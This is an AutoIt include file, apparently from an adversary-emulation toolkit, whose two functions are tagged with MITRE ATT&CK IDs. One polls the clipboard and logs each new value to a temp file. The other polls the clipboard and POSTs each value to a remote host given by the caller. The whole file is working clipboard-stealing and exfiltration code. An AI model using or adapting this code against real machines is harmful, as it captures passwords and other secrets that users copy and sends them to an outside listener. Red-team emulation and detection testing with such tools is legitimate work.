#include-once

; Clipboard monitoring and exfiltration

Func ClipboardToLog($iTimeout = 10, $sLogPath = @TempDir & "\clipboard.dump") ;DESCRIPTION:Poll the clipboard and append each new value to a local file;MITRE:Collection T1115
   Local $sPrev = ""
   While $iTimeout > 0
      Local $sCurrent = ClipGet()
      Sleep(1000)
      If $sCurrent <> $sPrev Then
         $sPrev = $sCurrent
         LogToFile($sCurrent, $sLogPath)
      EndIf
      $iTimeout -= 1
   WEnd
   Return True
EndFunc

Func ClipboardToWeb($sHost, $sTag, $sPort = "80", $iTimeout = 10) ;DESCRIPTION:Poll the clipboard and POST each new value to a remote listener;MITRE:Collection T1115,Exfiltration T1041
   Local $sPrev = ""
   While $iTimeout > 0
      Local $sCurrent = ClipGet()
      Sleep(1000)
      If $sCurrent <> $sPrev Then
         $sPrev = $sCurrent
         HttpPost($sHost, $sTag, $sPort, $sCurrent)
      EndIf
      $iTimeout -= 1
   WEnd
   Return True
EndFunc
